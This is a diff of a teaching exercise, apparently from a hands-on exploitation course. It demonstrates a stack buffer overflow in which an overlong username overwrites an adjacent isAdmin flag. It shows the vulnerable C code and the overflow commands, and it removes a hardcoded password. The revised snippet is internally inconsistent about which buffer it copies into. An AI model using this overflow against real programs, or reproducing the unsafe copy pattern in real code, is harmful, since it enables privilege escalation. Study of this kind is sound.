@@ -14,87 +14,35 @@ which enables us to gain "admin" privileges.
 * Deeper understanding of the stack
 
 
-## Vulnerable program
+## Source 
 
-We have the following program:
-
-challenge09.c:
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <crypt.h>
-#include <string.h>
-
-/* hash of: "ourteacheristehbest" */
-const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";
-
-
-int checkPassword(char *password) {
-    char *hash;
-
-    /* $6$ is SHA256 */
-    hash = crypt(password, "$6$saaaaalty");
-
-    if (strcmp(hash, adminHash) == 0) {
-        return 1;
-    } else {
-        return 0;
-    }
-}
-
-
-void handleData(char *username, char *password) {
-    int isAdmin = 0;
-    char name[64]; // should be enough for all usernames
-
-    // Check if user has admin privileges
-    isAdmin = checkPassword(password);
-
-    // create internal username
-    sprintf(name, "%s-%s", "cmd", username);
-
-    if(isAdmin > 0) {
-        printf("Hello %s.\nYou are admin!\nisAdmin: 0x%x\n", name, isAdmin);
-    } else {
-        printf("Hello %s.\nYou are not admin.\nisAdmin: 0x%x\n", name, isAdmin);
-    }
-}
-
-
-int main(int argc, char **argv) {
-    if (argc != 3) {
-        printf("Call: %s <name> <password>\n", argv[0]);
-        exit(0);
-    }
-
-    handleData(argv[1], argv[2]);
-}
-```
+* Source directory: `~/challenges/challenge09/`
+* Source files: [challenge09](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge09)
 
 You can compile it by calling `make` in the folder `~/challenges/challenge09`
 
 
 ## Vulnerability
 
+Read the source of `challenge09.c`.
+
 The vulnerability lies here:
 
 ```
 void handleData(char *username, char *password) {
     int isAdmin = 0;
-    char name[64]; // should be enough for all usernames
-	[...]
-	strcpy(firstname, username);
-	[...]
+    char name[128];
+	...
+	strcpy(firstname, username); // strcpy() is unsafe
+	...
 }
 
-
 int main(int argc, char **argv) {
-	[...]
-    sprintf(name, "%s-%s", "cmd", username);
+    handleData(argv[1], argv[2]);
 }
 ```
 
-The second argument of the program is copied into a stack buffer `name` of 64 byte size.
+The first argument of the program is copied into a stack buffer `name` of 128 byte size.
 After this buffer `name`, an important variable called `isAdmin` is located.
 
 
@@ -103,52 +51,54 @@ After this buffer `name`, an important variable called `isAdmin` is located.
 Lets execute the program with normal length string, and with a wrong password:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon test
-Hello cmd-sheldon.
-You are not admin.
+~/challenges/challenge09$ ./challenge09 sheldon password
 isAdmin: 0x0
+Not admin.
 ```
 
-The password "test" seems to be not correct, as the program tells us "You are not admin".
+The password "password" seems to be not correct. We dont know
+what the actual password is.
 
+But with the correct password, it would look like this:
 
-Lets execute it with the correct password `ourteacheristehbest`:
 ```
-root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 sheldon ourteacheristehbest
-Hello cmd-sheldon.
-You are admin!
+~/challenges/challenge09$ ./challenge09 sheldon ...
 isAdmin: 0x1
-```
-
-With the correct password, a message will be printed indicating that the user "cmd-sheldon"
-has admin privileges.
-
-## Abnormal behaviour - overflow
-
-What happens when you insert a string which is longer than 64 bytes? Lets try it.
-We can use python to print 70 characters:
-
-```
-root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*70'` test
-Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
-isAdmin: 0x41414141
 ```
 
-## Abnormal behaviour - more overflow
 
-What if we even add some more characters? Lets say 100.
+## Abnormal behaviour - buffer overflow
+
+What happens when you insert a string which is longer than 128 bytes? Lets try it.
+We can use perl to print 130 characters:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge09# ./challenge09 `python -c 'print "A"*100'` test
-Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
+~/challenges/challenge09$ ./challenge09 `perl -e 'print "A" x 130'` password
+isAdmin: 0x4141
 You are admin!
+```
+
+It appears that we have overwritten the `isAdmin` variable with the content `0x4141`. 
+
+
+## Abnormal behaviour - more buffer overflow
+
+What if we even add some more characters? Lets say 140.
+
+```
+~/challenges/challenge09$ ./challenge09 `perl -e 'print "A" x 140'` password
 isAdmin: 0x41414141
+You are admin!
 Segmentation fault (core dumped)
 ```
 
+Not only is the `isAdmin` variable `0x41414141`, but we also get a `Segmentation fault` 
+at the end.
 
-## Questions
 
-* What is happening here? Why Are we "admin" if we use a username which is 70 bytes long?
-* Why does it crash, if we use a username which is 100 bytes long?
+## Things to think about
+
+* What is happening here? Why Are we "admin" if we use a username which is 130 bytes long?
+* Why do we get a segmentation fault if we use a username which is 140 bytes long?
+
